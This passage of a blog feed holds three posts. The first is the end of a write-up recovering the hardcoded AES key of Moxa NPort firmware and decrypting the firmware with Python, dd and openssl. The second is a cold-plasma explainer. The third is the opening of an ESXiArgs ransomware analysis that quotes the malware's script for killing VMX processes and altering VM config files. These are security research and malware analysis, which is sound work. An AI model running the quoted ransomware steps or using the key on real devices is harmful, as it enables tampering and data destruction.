</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0xa7</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x8b</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x2d</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_24</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">fw_buffer_size</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uStack_20</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">param_3</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">ecb128Decrypt</span>(<span style="color:#e06c75">fw_buffer</span>,<span style="color:#e06c75">fw_buffer</span>,<span style="color:#e06c75">decrypt_size</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uVar4</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span>(<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">fw_buffer</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (((<span style="color:#d19a66">0x28</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">uVar4</span>) <span style="color:#56b6c2">&amp;&amp;</span> (<span style="color:#e06c75">bVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">fw_buffer</span>[<span style="color:#d19a66">0xd</span>], (<span style="color:#e06c75">bVar1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span>) <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">uVar4</span>)) <span style="color:#56b6c2">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>     (<span style="color:#e06c75">fw_buffer</span>[<span style="color:#d19a66">0xe</span>] <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;\0&#39;</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">memcpy</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_24</span>,<span style="color:#e06c75">fw_buffer</span> <span style="color:#56b6c2">+</span> (<span style="color:#e06c75">uint</span>)<span style="color:#e06c75">bVar1</span> <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x24</span>,<span style="color:#d19a66">4</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">puVar2</span> <span style="color:#56b6c2">=</span> (<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span>)<span style="color:#61afef;font-weight:bold">cal_crc32</span>((<span style="color:#e5c07b">int</span>)(<span style="color:#e06c75">fw_buffer</span> <span style="color:#56b6c2">+</span> (<span style="color:#e06c75">uint</span>)<span style="color:#e06c75">bVar1</span> <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x24</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span>),
</span></span><span style="display:flex;"><span>                               <span style="color:#e06c75">uVar4</span> <span style="color:#56b6c2">+</span> (<span style="color:#e06c75">fw_buffer</span>[<span style="color:#d19a66">0xd</span>] <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span>) <span style="color:#56b6c2">*</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">4</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">puVar2</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">local_24</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> ((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">uVar4</span> <span style="color:#56b6c2">&lt;=</span> (<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">decrypt_size</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">*</span><span style="color:#e06c75">fw_buffer_size</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">uVar4</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">return</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">return_value</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s go through each part here:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>;
</span></span></code></pre></div><p><code>passwd.3309</code> looks like a password variable. We know that this was also passed into <code>ecb128Decrypt</code> as the <code>decrypt_key</code>. We&rsquo;re gonna keep a close eye on this. We can see that <code>pbVar3</code> will hold the value of <code>passwd.3309</code> so we&rsquo;ll rename <code>pbVar3</code> to <code>password</code>.</p>
<p>Next, in the <em>while</em> loop, we can see some <em>XOR</em> operations being done on the <code>password</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">while</span> (<span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">ubuf</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0xa7</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x8b</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x2d</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This could be an indication of an obfuscation or encryption scheme. We&rsquo;ll take a closer look at this by trying to reimplement the operation in a Python script.</p>
<p>Firstly, we need to get the hex data that <code>passwd.3309</code> is pointing to, we can do this by looking at the <strong>Bytes</strong> window in Ghidra:</p>

    <img src="/img/nport-firmware/nport-firmware-fw_decrypt-passwd-bytes.png"  alt="NPort firmware fw_decrypt passwd3309 bytes"  class="center"  style="padding: 10px"  />


<p>We&rsquo;ll copy all those highlighted bytes into a Python array:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">passwd</span> <span style="color:#56b6c2">=</span> [<span style="color:#d19a66">0x95</span>, <span style="color:#d19a66">0xb3</span>, <span style="color:#d19a66">0x15</span>, <span style="color:#d19a66">0x32</span>, <span style="color:#d19a66">0xe4</span>, <span style="color:#d19a66">0xe4</span>, <span style="color:#d19a66">0x43</span>, <span style="color:#d19a66">0x6b</span>, <span style="color:#d19a66">0x90</span>, <span style="color:#d19a66">0xbe</span>, <span style="color:#d19a66">0x1b</span>, <span style="color:#d19a66">0x31</span>, <span style="color:#d19a66">0xa7</span>, <span style="color:#d19a66">0x8b</span>, <span style="color:#d19a66">0x2d</span>, <span style="color:#d19a66">0x05</span>]
</span></span></code></pre></div><p>Next, we need to implement a <em>while</em> loop that can do all the XOR operations of the decompiled <em>while</em> loop:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">while</span> (<span style="color:#e06c75">i</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e5c07b">len</span>(<span style="color:#e06c75">passwd</span>)):
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">0xa7</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">0x8b</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">2</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">0x2d</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">3</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">5</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+=</span> <span style="color:#d19a66">4</span>
</span></span></code></pre></div><p>Once this loop is done, we can print out the password:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;&#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">join</span>(<span style="color:#e5c07b">chr</span>(<span style="color:#e06c75">byte</span>) <span style="color:#c678dd">for</span> <span style="color:#e06c75">byte</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">passwd</span>))
</span></span></code></pre></div><p>And that&rsquo;s done, we now have the completed script:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">passwd</span> <span style="color:#56b6c2">=</span> [<span style="color:#d19a66">0x95</span>, <span style="color:#d19a66">0xb3</span>, <span style="color:#d19a66">0x15</span>, <span style="color:#d19a66">0x32</span>, <span style="color:#d19a66">0xe4</span>, <span style="color:#d19a66">0xe4</span>, <span style="color:#d19a66">0x43</span>, <span style="color:#d19a66">0x6b</span>, <span style="color:#d19a66">0x90</span>, <span style="color:#d19a66">0xbe</span>, <span style="color:#d19a66">0x1b</span>, <span style="color:#d19a66">0x31</span>, <span style="color:#d19a66">0xa7</span>, <span style="color:#d19a66">0x8b</span>, <span style="color:#d19a66">0x2d</span>, <span style="color:#d19a66">0x05</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">while</span> (<span style="color:#e06c75">i</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e5c07b">len</span>(<span style="color:#e06c75">passwd</span>)):
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">0xa7</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">0x8b</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">2</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">0x2d</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">3</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">5</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+=</span> <span style="color:#d19a66">4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;&#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">join</span>(<span style="color:#e5c07b">chr</span>(<span style="color:#e06c75">byte</span>) <span style="color:#c678dd">for</span> <span style="color:#e06c75">byte</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">passwd</span>))
</span></span></code></pre></div><p>If we run this, we get this as an output:</p>

    <img src="/img/nport-firmware/nport-firmware-fw_decrypt-python-output.png"  alt="NPort firmware fw_decrypt while loop reimplemented in python"  class="center"  style="padding: 10px"  />


<p>So that means the password or the AES decrypt key of this program is &ldquo;<em>2887Conn7564</em>&rdquo;. We can now use this to decrypt the encrypted file. We need to convert this into hexadecimal first before we can use it:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;&#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">join</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">byte</span>)[<span style="color:#d19a66">2</span>:] <span style="color:#c678dd">for</span> <span style="color:#e06c75">byte</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">passwd</span>))
</span></span></code></pre></div><p>This Python line will give us this hex value: <em>32383837436f6e6e373536340000</em>.</p>
<h1 id="the-decryption">The decryption</h1>
<p>Now that we have the key, how do we decrypt this firmware?</p>
<p>We can use <em>OpenSSL</em> to decrypt this. The <code>openssl</code> command-line tool does support AES 128-bit ECB mode so let&rsquo;s use that.</p>
<p>Before we can start decrypting, remember that back when we were reverse engineering the <code>ecb128Decrypt</code> function and doing the <code>hexdump</code>, we found out the exact amount of padding bytes this encrypted firmware has: <em>0x28</em> in hex or 40 in decimal.</p>
<p>So in order to decrypt the data, we need to remove the padding bytes first or it will also decrypt the padding bytes. I&rsquo;ll use <code>dd</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ dd <span style="color:#c678dd">if</span><span style="color:#56b6c2">=</span>moxa-nport-w2150a-w2250a-series-firmware-v2.2.rom <span style="color:#e06c75">of</span><span style="color:#56b6c2">=</span>firmware-offseted.encrypted <span style="color:#e06c75">bs</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span> <span style="color:#e06c75">skip</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">40</span>
</span></span><span style="display:flex;"><span>8874768+0 records in
</span></span><span style="display:flex;"><span>8874768+0 records out
</span></span><span style="display:flex;"><span><span style="color:#d19a66">8874768</span> bytes transferred in 54.281718 secs <span style="color:#56b6c2">(</span><span style="color:#d19a66">163495</span> bytes/sec<span style="color:#56b6c2">)</span>
</span></span></code></pre></div><blockquote>
<p><strong>Note</strong>: <code>bs</code> means block size, <code>skip</code> means bytes to skip</p>
</blockquote>
<p>Now we can use <code>openssl</code> to decrypt the new <code>firmware-offseted.encrypted</code> file by running it in decrypt mode and giving it our AES decrypt key:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl aes-128-ecb -d -K <span style="color:#98c379">&#34;32383837436f6e6e373536340000&#34;</span> -in firmware-offseted.encrypted -out firmware.decrypted
</span></span></code></pre></div><p>This will output a <code>firmware.decrypted</code> file. Now if we run <code>binwalk</code> on this decrypted file:</p>

    <img src="/img/nport-firmware/nport-firmware-firmware-decrypted-openssl.png"  alt="NPort firmware decrypted binwalk"  class="center"  style="padding: 10px"  />


<p>Now we can actually extract the files into <code>_firmware.decrypted.extracted</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk -e firmware.decrypted
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">cd</span> _firmware.decrypted.extracted
</span></span></code></pre></div><p>Remember to give the <code>squashfs-root</code> directories execution permission:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x -R squashfs-root*
</span></span></code></pre></div><p>Now we have full access to the firmware:</p>

    <img src="/img/nport-firmware/nport-firmware-firmware-decrypted-filesystem.png"  alt="NPort firmware decrypted filesystem"  class="center"  style="padding: 10px"  />


<h1 id="the-conclusion">The conclusion</h1>
<p>That was how to reverse engineer and decrypt an encrypted firmware. We learned a fair about how to analyze a firmware for vulnerabilities and exploit those vulnerabilities.</p>
<blockquote>
<p>You can find the Ghidra files and the Python script <a href="https://github.com/namberino/NPort-firmware-decrypt">here</a></p>
</blockquote>
]]></content>
        </item>
        
        <item>
            <title>Fire! But cold</title>
            <link>https://namberino.github.io/posts/2024/04/fire-but-cold/</link>
            <pubDate>Thu, 18 Apr 2024 20:57:47 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/04/fire-but-cold/</guid>
            <description>I recently came across some experiment on youtube about something called &amp;ldquo;cold fire&amp;rdquo;. It sound contradictory, right? How can fire, something that is inherently hot, be cold? Well, that is what we are going to explore in this blog post.
What is fire? To understand fire, we need to understand plasma. It is the 4th state of matter, right after gas. When a gas gets extremely hot, the electrons inside a substance have enough energy to detach from their atom and move freely.</description>
            <content type="html"><![CDATA[<p>I recently came across some experiment on youtube about something called <em>&ldquo;cold fire&rdquo;</em>. It sound contradictory, right? How can fire, something that is inherently hot, be cold? Well, that is what we are going to explore in this blog post.</p>
<h1 id="what-is-fire">What is fire?</h1>
<p>To understand fire, we need to understand <strong>plasma</strong>. It is the 4th state of matter, right after gas. When a gas gets extremely hot, the electrons inside a substance have enough energy to detach from their atom and move freely. This makes the atoms become highly charged due to the lack of electrons and they form a collection of charged particles.</p>
<p>Fire can be defined <strong>partial plasma</strong> because fire&rsquo;s ionization is low due to the very low percentage of ionized atoms compared to the total number of atoms in the gas. Even though it is considered a low grade plasma compared to something like for example lightning, it is still extremely hot.</p>
<p>Something that is important to understand is that a plasma has 2 sets of temperature:</p>
<ul>
<li>Electron temperature</li>
<li>Ion/Atom temperature</li>
</ul>
<p>Because of the way fire is released (<em>A burst of energy</em>), the atoms get very hot as the reaction happens and the electrons move around. This is actually what happens in most plasmas. If you put more energy into the plasma, the temperature of the atoms rise substantially. This is called hot plasma (or its scientific name &ldquo;Local Thermal Equilibrium Plasma&rdquo; because the temperature of atoms and electrons are equal)</p>

    <img src="/img/cold-fire/match-fire.jpg"  alt="Plasma on match"  class="center"  style="padding: 10px"  />


<p>However, this isn&rsquo;t the only option. If you somehow apply energy in someway that just heats up the electron and keep the atoms cold, you&rsquo;d have a plasma that has an electron temperature of around <em>3 - 15</em> thousand degrees. This is called cold plasma (or its scientific name &ldquo;Non Thermal Equilibrium Plasma&rdquo; because the atoms are at a much lower temperature compared to the electrons, which brings down the average temperature of the plasma). This would actually feel cold because tiny electrons with very little mass compared to atoms don&rsquo;t have the momentum to transfer heat to a large object.</p>
<p>So you can actually touch a cold plasma torch without hurting yourself.</p>

    <img src="/img/cold-fire/cold-plasma-finger.jpg"  alt="Finger touching cold plasma"  class="center"  style="padding: 10px"  />


<h1 id="the-making-of-cold-plasma">The making of cold plasma</h1>
<p>Now that we got the basic theory of plasma and cold plasma down, how can we make cold plasma?</p>
<p>Anyone who&rsquo;s ever played with high voltage (any fellow electrical engineers and enthusiasts out there) knows that high voltage sources allows you to pull a long stream of plasma as soon as the wires get close enough. If you want to see this in action, just watch <a href="https://youtu.be/m7VP36diOKY?si=Bape72WkVFGqrr1b&t=132">this Electroboom video</a></p>
<p>This happens because the electrons in the wires have enough energy to jump out of the wire over a fairly long distance to the common ground to release their energy. As the wires get closer, some electrons jump over the short gap, this will ionize the air molecules around the wires, making more electrons jump over. This also make the air more conductive as the air&rsquo;s electrons are knocked out, which means the electrons has a conductive path to flow through. The more electrons flow, the more ionized the air becomes, the hotter everything around this becomes.</p>
<p>So we can take advantage of this phenomenon to create a stable stream of plasma. We can make this more stable by increasing the voltage but that&rsquo;s pretty costly, so we increase the frequency of the voltage to create a stable plasma arc (the frequency should be in the low radio ranges).</p>
<p>A typical microwave transformer running from city power lines is around <em>60Hz</em> or 60 times per second. The distance that the electrons can jump is proportional to the voltage and 60Hz can create longer wait time between the peaks, where the electrons have the most energy and can jump the farthest. By increasing the frequency, there&rsquo;s more frequent voltage peaks, more time for the electrons to jump with the highest energy.</p>
<p>By doing this, we all so create something called a <em>&ldquo;Far field effect&rdquo;</em>. If we increase the frequency of to low radio ranges, the wire will start to radiate radio waves which can energize the electrons. And we know that more energy means more jump distance.</p>
<p>We can utilize this by directing the electrons by directing them through an insulating tube through a stream of easily ionizable gas like helium or argon. The electrons will ionize the gas, turning it into plasma and the high frequency will help keep this energized.</p>
<p>Because the gas atom isn&rsquo;t exposed to enough energy to heat them up in the short time they are in the tube, the electrons will absorb most of the energy, making the plasma cold plasma.</p>
<h1 id="but-why-cold-plasma">But why cold plasma?</h1>
<p>There&rsquo;s a couple reasons why we need cold plasma:</p>
<ul>
<li>The cold plasma is full of highly reactive charged particles, which can destroy microorganisms very quickly. So this can be used for sterilization without harming the thing it&rsquo;s sterilizing.</li>
<li>The reactive charged particles can be used inside chemistry like seperating a chemical compound.</li>
<li>It&rsquo;s just so cool. I mean come on, it&rsquo;s like magic in real life.</li>
</ul>
<h1 id="making-cold-plasma-yourself">Making cold plasma yourself</h1>
<blockquote>
<p><strong>Disclaimer</strong>: Working with high voltage is <strong>VERY</strong> dangerous. If you don&rsquo;t know what you&rsquo;re doing or you don&rsquo;t have much experience with this, <strong>DO NOT DO THIS</strong>. If you are going to make cold plasma, make sure to take proper precautions.</p>
</blockquote>
<p>If you have a high voltage, high frequency generator, some insulating tubes and a tank of easily ionizable gas, you can make cold plasma yourself. You can check out this tutorial from the <em>Plasma Channel</em> if you want to make one:</p>


    
    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/wOV8kliF4eo?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
      ></iframe>
    </div>

]]></content>
        </item>
        
        <item>
            <title>ESXiArgs: An Analysis</title>
            <link>https://namberino.github.io/posts/2024/04/esxiargs-an-analysis/</link>
            <pubDate>Mon, 01 Apr 2024 14:42:54 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/04/esxiargs-an-analysis/</guid>
            <description>Last year, a ransomware attack called ESXiArgs managed to encrypt hundreds of VMware machines in multiple different countries. And I decided to try my hands at reverse engineering and analyzing this malware to see how it works. So without further ado, let&amp;rsquo;s reverse this.
Note: The malware sample was provided by the bleepingcomputer forum
The script So right out of the gate, in the script, there&amp;rsquo;s a section called CHANGE CONFIG:</description>
            <content type="html"><![CDATA[<p>Last year, a ransomware attack called <strong>ESXiArgs</strong> managed to encrypt hundreds of VMware machines in multiple different countries. And I decided to try my hands at reverse engineering and analyzing this malware to see how it works. So without further ado, let&rsquo;s reverse this.</p>
<blockquote>
<p>Note: The malware sample was provided by the <a href="https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14#entry5470686">bleepingcomputer forum</a></p>
</blockquote>
<h1 id="the-script">The script</h1>
<p>So right out of the gate, in the script, there&rsquo;s a section called <code>CHANGE CONFIG</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#7f848e">## CHANGE CONFIG</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> config_file in <span style="color:#c678dd">$(</span>esxcli vm process list | grep <span style="color:#98c379">&#34;Config File&#34;</span> | awk <span style="color:#98c379">&#39;{print $3}&#39;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;FIND CONFIG: </span><span style="color:#e06c75">$config_file</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span>  sed -i -e <span style="color:#98c379">&#39;s/.vmdk/1.vmdk/g&#39;</span> -e <span style="color:#98c379">&#39;s/.vswp/1.vswp/g&#39;</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$config_file</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">done</span>
</span></span></code></pre></div><p>This will find the config files and changing the <code>vmdk</code> config files to <code>vswp</code> files. So nothing super interesting here.</p>
<p>In the next section, the script is stopping the <code>VMX</code> process:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#7f848e">## STOP VMX</span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;KILL VMX&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">kill</span> -9 <span style="color:#c678dd">$(</span>ps | grep vmx | awk <span style="color:#98c379">&#39;{print $2}&#39;</span><span style="color:#c678dd">)</span>
</span></span></code></pre></div><p>The <code>VMX</code> process is responsible for handling I/O devices. It is also responsible for communicating with user interfaces, snapshot managers, and remote console.</p>
<p>The next section is the &ldquo;meat&rdquo; of the malware, the <em>encrypt</em> section:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#7f848e">## ENCRYPT</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>chmod +x <span style="color:#e06c75">$CLEAN_DIR</span>/encrypt
</span></span><span style="display:flex;"><span>
